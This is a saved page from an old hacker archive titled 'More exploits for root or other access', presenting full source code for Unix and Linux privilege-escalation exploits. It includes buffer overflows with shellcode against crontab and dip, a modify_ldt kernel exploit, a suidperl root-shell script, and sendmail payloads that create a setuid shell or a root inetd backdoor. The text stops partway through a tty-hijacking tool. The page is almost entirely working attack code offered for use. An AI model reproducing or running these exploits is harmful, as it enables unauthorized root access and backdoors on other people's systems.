<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
<!-- saved from url=(0053)http://www.atomicfrog.com/archives/hackunix/apx3.html -->
<HTML><HEAD><TITLE>Atomicfrog.com - Hacker Resources - Apendix 3</TITLE>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<META content="MSHTML 6.00.2600.0" name=GENERATOR></HEAD>
<BODY text=#d0d0d0 vLink=#808080 link=#00ff00 bgColor=#000000 ?><B><FONT 
size=+1>More exploits for root or other access</FONT></B>&nbsp; <BR><BR>Topics: 
<BR><A href="http://www.atomicfrog.com/archives/hackunix/apx3.html#1">Vixie 
Crontab Buffer Overflow for RedHat Linux</A>&nbsp; <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#2">Root Dip 
Exploit</A>&nbsp; <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#3">ldt - Text By 
Quantumg</A>&nbsp; <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#4">Suid Perl&nbsp; - 
Text By Quantumg</A>&nbsp; <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#5">Abuse Sendmail 
8.6.9</A>&nbsp; <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#6">ttysurf - Grab 
Someone's tty</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#7">shadow.c&nbsp; - 
Get Shadow passwd Files</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#8">Abuse Root 
Exploit (linux game program)</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#9">Doom (game) Root 
Exploit - Makes Suid Root Shell</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#10">Dosmenu Suid 
Root Exploit</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#11">Doom Root 
killmouse Exploit</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#12">Root Exploit For 
Resize Icons</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#13">Root Console 
Exploit For restorefont</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#14">Root rxvt X 
Server Exploit</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#15">Root wuftpd 
Exploit</A> <BR><A 
href="http://www.atomicfrog.com/archives/hackunix/apx3.html#16">A Shell Script 
Called gimme, Used To Read Any System File</A> <BR><BR><A name=1></A><B><FONT 
size=+1>Vixie Crontab Buffer Overflow for RedHat Linux</FONT></B>&nbsp; 
<BR><BR>If crontab is suid it is more then likely exploitable. 
<BR><BR><BR>-----------cut here <BR><BR>/* vixie crontab buffer overflow for 
RedHat Linux <BR>&nbsp;* <BR>&nbsp;* I don't think too many people know that 
redhat uses vixie crontab. <BR>&nbsp;* I didn't find this, just exploited it. 
<BR>&nbsp;* <BR>&nbsp;* <BR>&nbsp;* Dave G. &lt;daveg@escape.com&gt; <BR>&nbsp;* 
10/13/96 <BR>&nbsp;* <BR>&nbsp;*/ <BR>&nbsp; <BR>#include &lt;stdio.h&gt; 
<BR>#include &lt;sys/types.h&gt; <BR>#include &lt;stdlib.h&gt; <BR>#include 
&lt;fcntl.h&gt; <BR>#include &lt;unistd.h&gt; <BR>&nbsp; <BR>#define 
DEFAULT_OFFSET&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -1240 
<BR>#define 
BUFFER_SIZE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
100&nbsp;&nbsp;&nbsp;&nbsp; /* MAX_TEMPSTR is 100 */ <BR>#define 
HAPPY_FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
"./Window" <BR>&nbsp; <BR>long get_esp(void) <BR>{ <BR>&nbsp;&nbsp; 
__asm__("movl %esp,%eax\n"); <BR>} <BR>&nbsp; <BR>main(int argc, char **argv) 
<BR>{ <BR>&nbsp;&nbsp; int fd; <BR>&nbsp;&nbsp; char *buff = NULL; 
<BR>&nbsp;&nbsp; unsigned long *addr_ptr = NULL; <BR>&nbsp;&nbsp; char *ptr = 
NULL; <BR>&nbsp; u_char execshell[] = <BR>&nbsp;&nbsp; 
"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f" 
<BR>&nbsp;&nbsp; 
"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd" 
<BR>&nbsp;&nbsp; "\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/bin/sh"; 
<BR>&nbsp; <BR>&nbsp; <BR>&nbsp; <BR>/* <BR>&nbsp;* The sscanf line reads for 
'name' as %[^ =].&nbsp; Neither a space, nor <BR>&nbsp;* a '=' character appears 
below <BR>&nbsp;*/ <BR>&nbsp; <BR>&nbsp; <BR>&nbsp;&nbsp; int i; 
<BR>&nbsp;&nbsp; int ofs = DEFAULT_OFFSET; <BR>&nbsp; <BR>&nbsp;&nbsp; /* if we 
have a argument, use it as offset, else use default */ <BR>&nbsp;&nbsp; if(argc 
== 2) <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ofs = atoi(argv[1]); <BR>&nbsp;&nbsp; 
else if (argc &gt; 2) { <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr, "egg 
[offset]\n"); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(-1); <BR>&nbsp;&nbsp; } 
<BR>&nbsp;&nbsp; /* print the offset in use */ <BR>&nbsp;&nbsp; printf("Using 
offset of esp + %d (%x)\n", ofs, get_esp()+ofs); <BR>&nbsp; <BR>&nbsp;&nbsp; 
buff = malloc(4096); <BR>&nbsp;&nbsp; if(!buff) <BR>&nbsp;&nbsp; { 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("can't allocate memory\n"); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0); <BR>&nbsp;&nbsp; } <BR>&nbsp;&nbsp; 
ptr = buff; <BR>&nbsp;&nbsp; /* fill start of buffer with nops */ 
<BR>&nbsp;&nbsp; memset(ptr, 0x90, BUFFER_SIZE-strlen(execshell)); 
<BR>&nbsp;&nbsp; ptr += BUFFER_SIZE-strlen(execshell); <BR>&nbsp;&nbsp; /* stick 
asm code into the buffer */ <BR>&nbsp;&nbsp; for(i=0;i &lt; 
strlen(execshell);i++) <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *(ptr++) = 
execshell[i]; <BR>&nbsp; <BR>&nbsp;&nbsp; addr_ptr = (long *)ptr; 
<BR>&nbsp;&nbsp; for(i=0;i &lt; (878/4);i++) <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
*(addr_ptr++) = get_esp() + ofs; <BR>&nbsp;&nbsp; ptr = (char *)addr_ptr; 
<BR>&nbsp;&nbsp; *ptr++ = '='; <BR>&nbsp;&nbsp; *ptr++ = 'X'; <BR>&nbsp;&nbsp; 
*ptr++ = '\n'; <BR>&nbsp;&nbsp; *ptr = 0; <BR>&nbsp;&nbsp; printf("Writing to 
%s\n", HAPPY_FILE); <BR>&nbsp; <BR>/* <BR>&nbsp;* The sleep is required because 
as soon as crontab opens the tmp file it <BR>&nbsp;* stat's and saves it.&nbsp; 
After the EDITOR program exists it stats again <BR>&nbsp;* and if they are equal 
then it assumes changes weren't made and exits. <BR>&nbsp;*/ <BR>&nbsp;&nbsp; fd 
= open(HAPPY_FILE, O_WRONLY|O_CREAT, 0666); <BR>&nbsp;&nbsp; write (fd, buff, 
strlen(buff)); <BR>&nbsp; <BR>&nbsp;&nbsp; close(fd); <BR>&nbsp; 
<BR>&nbsp;&nbsp; execl("/usr/bin/crontab","crontab",HAPPY_FILE,NULL); 
<BR>&nbsp;&nbsp; /* Successful completion */ <BR>&nbsp;&nbsp; exit(0); <BR>} 
<BR>----------- cut here <BR><BR><BR><A name=2></A><B><FONT size=+1>Root Dip 
Exploit</FONT></B>&nbsp; <BR><BR>in /sbin you will find a symbolic link called 
dip to a suid root binary. <BR>Chances are, if this file is suid, it's 
sploitable. <BR><BR>-------- cut here <BR><BR>#include &lt;unistd.h&gt; 
<BR>#include &lt;stdio.h&gt; <BR>#include &lt;stdlib.h&gt; <BR>#include 
&lt;fcntl.h&gt; <BR>#include &lt;sys/stat.h&gt; <BR>#define PATH_DIP "/sbin/dip" 
<BR>u_char shell[] = 
<BR>"\xeb\x24\x5e\x8d\x1e\x89\x5e\x0b\x33\xd2\x89\x56\x07\x89\x56\x0f" 
<BR>"\xb8\x1b\x56\x34\x12\x35\x10\x56\x34\x12\x8d\x4e\x0b\x8b\xd1\xcd" 
<BR>"\x80\x33\xc0\x40\xcd\x80\xe8\xd7\xff\xff\xff/tmp/hs"; <BR>u_long esp() { 
__asm__("movl %esp, %eax"); } <BR>main() <BR>{ <BR>&nbsp; u_char buf[1024]; 
<BR>&nbsp; u_long addr; <BR>&nbsp; int i, f; <BR><BR>&nbsp; strcpy(buf, "chatkey 
"); <BR>&nbsp; addr = esp() - 192; <BR>&nbsp; for (i=8; i&lt;128+16; i+=4) 
<BR>&nbsp;&nbsp;&nbsp; *((u_long *) (buf+i)) = addr; <BR>&nbsp; for (i=128+16; 
i&lt;512; i++) <BR>&nbsp;&nbsp;&nbsp; buf[i] = 0x90; <BR>&nbsp; for (i=0; 
i&lt;strlen(shell); i++) <BR>&nbsp;&nbsp;&nbsp; buf[512+i] = shell[i]; 
<BR>&nbsp; buf[512+i] = '\n'; <BR><BR>&nbsp; if ((f = open("/tmp/temp.dip", 
O_WRONLY|O_TRUNC|O_CREAT, 0600)) &lt; 0) { <BR>&nbsp;&nbsp;&nbsp; 
perror("temp.dip"); <BR>&nbsp;&nbsp;&nbsp; exit(0); <BR>&nbsp; } <BR>&nbsp; 
write(f, buf, 512+i); <BR>&nbsp; close(f); <BR><BR>&nbsp; execl(PATH_DIP, "dip", 
"/tmp/temp.dip", (char *)0); <BR>} <BR><BR>---------- cut here <BR><BR><BR><A 
name=3></A>ldt - Text By Quantumg <BR><BR>this one is a little old but I'm 
rather proud of it so I thought I'd give <BR>it a praise.&nbsp; in writing the 
linux kernel the guys who wrote a certain <BR>section fucked up.&nbsp; they let 
you stretch and modify the area of memory <BR>you can access.&nbsp; at first the 
sploit required a System.map to be in the <BR>root dir.&nbsp; so the simple 
solution to the bug was to delete all System.map <BR>files off the system and 
remove all the uncompressed kernels (cause you <BR>can generate a System.map by 
doing an nm on uncompressed kernels), this <BR>is now rather stupid cause there 
are patches for all kernel versions with <BR>the bug and I have written a 
version of this sploit that doesn't need a <BR>System.map. <BR><BR>---------- 
cut here <BR>/* this is a hack of a hack.&nbsp; a valid System.map was needed to 
get this <BR>&nbsp;&nbsp; sploit to werk.. but not any longer.. This sploit will 
give you root <BR>&nbsp;&nbsp; if the modify_ldt bug werks.. which I beleive it 
does in any kernel <BR>&nbsp;&nbsp; before 1.3.20 .. <BR>&nbsp; <BR>&nbsp;&nbsp; 
QuantumG <BR>*/ <BR><BR>/* original code written by Morten Welinder. <BR>&nbsp;* 
<BR>&nbsp;* this required 2 hacks to work on the 1.2.13 kernel that I've tested 
on: <BR>&nbsp;* 1. asm/sigcontext.h does not exist on 1.2.13 and so it is 
removed. <BR>&nbsp;* 2. the _task in the System.map file has no leading 
underscore. <BR>&nbsp;* I am not sure at what point these were changed, if you 
are <BR>&nbsp;* using this on a newer kernel compile with NEWERKERNEL defined. 
<BR>&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&amp;nbs 
p; -ReD <BR>&nbsp;*/ <BR><BR>#include &lt;linux/ldt.h&gt; <BR>#include 
&lt;stdio.h&gt; <BR>#include &lt;linux/unistd.h&gt; <BR>#include 
&lt;signal.h&gt; <BR>#ifdef NEWERKERNEL <BR>#include &lt;asm/sigcontext.h&gt; 
<BR>#endif <BR>#define __KERNEL__ <BR>#include &lt;linux/sched.h&gt; 
<BR>#include &lt;linux/module.h&gt; <BR><BR>static inline 
_syscall1(int,get_kernel_syms,struct kernel_sym *,table); <BR>static inline 
_syscall3(int, modify_ldt, int, func, void *, ptr, unsigned long, bytecount) 
<BR><BR><BR>#define KERNEL_BASE 0xc0000000 <BR>/* 
------------------------------------------------------------------------ */ 
<BR>static __inline__ unsigned char <BR>__farpeek (int seg, unsigned ofs) <BR>{ 
<BR>&nbsp; unsigned char res; <BR>&nbsp; asm ("mov %w1,%%gs ; gs; movb 
(%2),%%al" <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : "=a" (res) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : "r" (seg), "r" (ofs)); <BR>&nbsp; 
return res; <BR>} <BR>/* 
------------------------------------------------------------------------ */ 
<BR>static __inline__ void <BR>__farpoke (int seg, unsigned ofs, unsigned char 
b) <BR>{ <BR>&nbsp; asm ("mov %w0,%%gs ; gs; movb %b2,(%1)" 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : /* No results.&nbsp; */ 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; : "r" (seg), "r" (ofs), "r" (b)); <BR>} 
<BR>/* ------------------------------------------------------------------------ 
*/ <BR>void <BR>memgetseg (void *dst, int seg, const void *src, int size) <BR>{ 
<BR>&nbsp; while (size-- &gt; 0) <BR>&nbsp;&nbsp;&nbsp; *(char *)dst++ = 
__farpeek (seg, (unsigned)(src++)); <BR>} <BR>/* 
------------------------------------------------------------------------ */ 
<BR>void <BR>memputseg (int seg, void *dst, const void *src, int size) <BR>{ 
<BR>&nbsp; while (size-- &gt; 0) <BR>&nbsp;&nbsp;&nbsp; __farpoke (seg, 
(unsigned)(dst++), *(char *)src++); <BR>} <BR>/* 
------------------------------------------------------------------------ */ 
<BR>int <BR>main () <BR>{ <BR>&nbsp; int stat, i,j,k; <BR>&nbsp; struct 
modify_ldt_ldt_s ldt_entry; <BR>&nbsp; FILE *syms; <BR>&nbsp; char line[100]; 
<BR>&nbsp; struct task_struct **task, *taskptr, thistask; <BR>&nbsp; struct 
kernel_sym blah[4096]; <BR><BR>&nbsp; printf ("Bogusity checker for modify_ldt 
system call.\n"); <BR><BR>&nbsp; printf ("Testing for page-size limit 
bug...\n"); <BR>&nbsp; ldt_entry.entry_number = 0; <BR>&nbsp; 
ldt_entry.base_addr = 0xbfffffff; <BR>&nbsp; ldt_entry.limit = 0; <BR>&nbsp; 
ldt_entry.seg_32bit = 1; <BR>&nbsp; ldt_entry.contents = 
MODIFY_LDT_CONTENTS_DATA; <BR>&nbsp; ldt_entry.read_exec_only = 0; <BR>&nbsp; 
ldt_entry.limit_in_pages = 1; <BR>&nbsp; ldt_entry.seg_not_present = 0; 
<BR>&nbsp; stat = modify_ldt (1, &amp;ldt_entry, sizeof (ldt_entry)); <BR>&nbsp; 
if (stat) <BR>&nbsp;&nbsp;&nbsp; /* Continue after reporting error.&nbsp; */ 
<BR>&nbsp;&nbsp;&nbsp; printf ("This bug has been fixed in your kernel.\n"); 
<BR>&nbsp; else <BR>&nbsp;&nbsp;&nbsp; { <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
printf ("Shit happens: "); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf 
("0xc0000000 - 0xc0000ffe is accessible.\n"); <BR>&nbsp;&nbsp;&nbsp; } 
<BR><BR>&nbsp; printf ("Testing for expand-down limit bug...\n"); <BR>&nbsp; 
ldt_entry.base_addr = 0x00000000; <BR>&nbsp; ldt_entry.limit = 1; <BR>&nbsp; 
ldt_entry.contents = MODIFY_LDT_CONTENTS_STACK; <BR>&nbsp; 
ldt_entry.limit_in_pages = 0; <BR>&nbsp; stat = modify_ldt (1, &amp;ldt_entry, 
sizeof (ldt_entry)); <BR>&nbsp; if (stat) <BR>&nbsp;&nbsp;&nbsp; { 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf ("This bug has been fixed in your 
kernel.\n"); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 1; <BR>&nbsp;&nbsp;&nbsp; 
} <BR>&nbsp; else <BR>&nbsp;&nbsp;&nbsp; { <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
printf ("Shit happens: "); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf 
("0x00000000 - 0xfffffffd is accessible.\n"); <BR>&nbsp;&nbsp;&nbsp; } 
<BR><BR>&nbsp; i = get_kernel_syms(blah); <BR>&nbsp; k = i+10; <BR>&nbsp; for 
(j=0; j&lt;i; j++) <BR>&nbsp;&nbsp; if (!strcmp(blah[j].name,"current") || 
!strcmp(blah[j].name,"_current")) k = j; <BR>&nbsp; if (k==i+10) { 
printf("current not found!!!\n"); return(1); } <BR>&nbsp; j=k; <BR><BR>&nbsp; 
taskptr = (struct task_struct *) (KERNEL_BASE + blah[j].value); <BR>&nbsp; 
memgetseg (&amp;taskptr, 7, taskptr, sizeof (taskptr)); <BR>&nbsp; taskptr = 
(struct task_struct *) (KERNEL_BASE + (unsigned long) taskptr); <BR>&nbsp; 
memgetseg (&amp;thistask, 7, taskptr, sizeof (thistask)); <BR>&nbsp; if 
(thistask.pid!=getpid()) { printf("current process not found\n"); return(1); } 
<BR>&nbsp; printf("Current process is %i\n",thistask.pid); <BR>&nbsp; taskptr = 
(struct task_struct *) (KERNEL_BASE + (unsigned long) thistask.p_pptr); 
<BR>&nbsp; memgetseg (&amp;thistask, 7, taskptr, sizeof (thistask)); <BR>&nbsp; 
if (thistask.pid!=getppid()) { printf("current process not found\n"); return(1); 
} <BR>&nbsp; printf("Parent process is %i\n",thistask.pid); <BR>&nbsp; 
thistask.uid = thistask.euid = thistask.suid = thistask.fsuid = 0; <BR>&nbsp; 
thistask.gid = thistask.egid = thistask.sgid = thistask.fsgid = 0; <BR>&nbsp; 
memputseg (7, taskptr, &amp;thistask, sizeof (thistask)); <BR>&nbsp; printf 
("Shit happens: parent process is now root process.\n"); <BR>&nbsp; return 0; 
<BR>}; <BR><BR>----------- cut here <BR><BR><BR><A name=4></A><B><FONT 
size=+1>Suid Perl&nbsp; - Text By Quantumg</FONT></B>&nbsp; <BR><BR>In the 
/usr/bin dir (usually) you will find a suid root binary called 
<BR>suidperl.&nbsp; If this file is suid root it is most probably sploitable. 
<BR><BR>You need to set this file suid <BR>(chmod 4700 will do it) and execute 
it to get root. <BR><BR>---------- cut here <BR><BR>#!/usr/bin/suidperl 
<BR>$&gt; = 
0;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
#set effective user id <BR>$ENV{'PATH'} = 
'/bin:/usr/bin';&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
#secure the session <BR>$ENV{'IFS'} = '' if $ENV{'IFS'} ne ''; <BR>$execpath = 
"/bin/sh";&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
#sameol sameol <BR>$execpath =~ 
/(.*)/;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
#untaint the variable <BR>$boom = 
$1;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
#$boom untainted <BR>system 
$boom;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
#run EUID=0 shell <BR><BR>----------------cut here <BR><BR><A 
name=5></A><B><FONT size=+1>Abuse Sendmail 8.6.9</FONT></B>&nbsp; 
<BR><BR>-----------cut here <BR>/* smh.c - atreus - Michael R. Widner (2/27/95) 
<BR>&nbsp;* &lt;widner@uchicago.edu&gt; &lt;atreus@primus.com&gt; <BR>&nbsp;* a 
quick hack to abuse sendmail 8.6.9 or whatever else is subject to this 
<BR>&nbsp;* hole.&nbsp; It's really just a matter of passing newlines in 
arguments to <BR>&nbsp;* sendmail and getting the stuff into the queue 
files.&nbsp; If we run this <BR>&nbsp;* locally with -odq we are guaranteed that 
it will be queue, rather than <BR>&nbsp;* processed immediately. <BR>&nbsp;* 
usage: smh [ username [/path/to/sendmail]] <BR>&nbsp;* It's worth noting that 
this is generally only good for getting bin. <BR>&nbsp;* sendmail still wants to 
process the sendmail.cf file, which contains <BR>&nbsp;* Ou1 and Og1 most of the 
time, limiting you to bin access.&nbsp; Is there <BR>&nbsp;* a way around this? 
<BR>&nbsp;* cc -o smh smh.c should do the trick.&nbsp; This just creates a bin 
owned <BR>&nbsp;* mode 6777 copy of /bin/sh in /tmp called /tmp/newsh.&nbsp; 
Note that on some <BR>&nbsp;* systems this is pretty much worthless, but you're 
smart enough to know <BR>&nbsp;* which systems those are.&nbsp; Aren't you? 
<BR>bash$ ./smh root /usr/lib/sendmail <BR>bash$ /usr/lib/sendmail -q <BR>*/ 
<BR>#include &lt;sys/types.h&gt; <BR>#include &lt;unistd.h&gt; <BR>#include 
&lt;stdlib.h&gt; <BR><BR>/* Take Your Pick */ <BR>#define EVIL_COMMAND1 
"ascii\nCroot\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c $u\nMlocal, P=/bin/sh, 
F=lsDFMeu, A=sh -c $u\nR&lt;\"|/bin/cp /bin/sh 
/tmp/newsh\"&gt;\nR&lt;\"|/bin/chmod 6777 /tmp/newsh\"&gt;\n$rascii " 
<BR>#define EVIL_COMMAND2 "ascii\nCroot\nMprog, P=/bin/sh, F=lsDFMeu, A=sh -c 
$u\nMlocal, P=/bin/sh, F=lsDFMeu, A=sh -c $u\nR&lt;\"|/bin/echo ingreslock 
stream tcp nowait root /bin/sh /bin/sh&nbsp; 
&gt;/tmp/.inetd.conf\"&gt;\nR&lt;\"|/usr/sbin/inetd 
/tmp/.inetd.conf\"&gt;\n$rascii " <BR><BR>main(argc, argv) <BR>int argc; 
<BR>char **argv; <BR>{ <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; execlp(argv[2] ? 
argv[2] : "sendmail","sendmail","-odq","-p", EVIL_COMMAND1, 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; argv[1] ? argv[1] : "atreus",0); <BR>} 
<BR><BR>----------- cut here <BR><A name=6></A><B><FONT size=+1>ttysurf - Grab 
Someone's tty</FONT></B>&nbsp; <BR><BR>------------cut here <BR>#include 
&lt;stdio.h&gt; <BR>#include &lt;signal.h&gt; <BR>#include &lt;fcntl.h&gt; 
<BR>#include &lt;errno.h&gt; <BR>#include &lt;sys/types.h&gt; <BR>#include 
&lt;sys/termios.h&gt; <BR><BR>#define DEBUG 
1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Enable additional debugging 
info (needed!) */ <BR>#define 
USLEEP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Define this if 
your UNIX supports usleep() */ <BR><BR>#ifdef ULTRIX <BR>#define TCGETS 
TCGETP&nbsp;&nbsp; /* Get termios structure */ <BR>#define TCSETS TCSANOW&nbsp; 
/* Set termios structure */ <BR>#endif <BR><BR><BR>handler(signal) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 
signal;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
/* signalnumber */ 
<BR>{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
/* do nothing, ignore the signal */ 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(DEBUG) printf("Ignoring signal 
%d\n",signal); <BR>} <BR><BR>int readandpush(f,string) <BR>FILE *f; <BR>char 
*string; <BR>{ <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char *cp,*result; 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int e; 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct termios termios; 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
result=fgets(string,20,f);&nbsp;&nbsp;&nbsp; /* Read a line into string */ 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (result==NULL) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("fgets()"); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
return(1); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if (DEBUG) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("String: %s\n",string); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
fflush(stdout); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } 
<BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
ioctl(0,TCGETS,&amp;termios);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* These 3 
lines turn off input echo */ 
<BR>&nbsp;/*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; echo = (termios.c_lflag 
&amp; ECHO);&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */ 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; termios.c_lflag=((termios.c_lflag 
| ECHO) - ECHO); <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
ioctl(0,TCSETS,&amp;termios); <BR><BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
for (cp=string;*cp;cp++)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* Push it 
back as input */ <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; e=ioctl(0,TIOCSTI,cp); 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
if(e&lt;0) 
<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
{&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; perror("ioctl()"); 
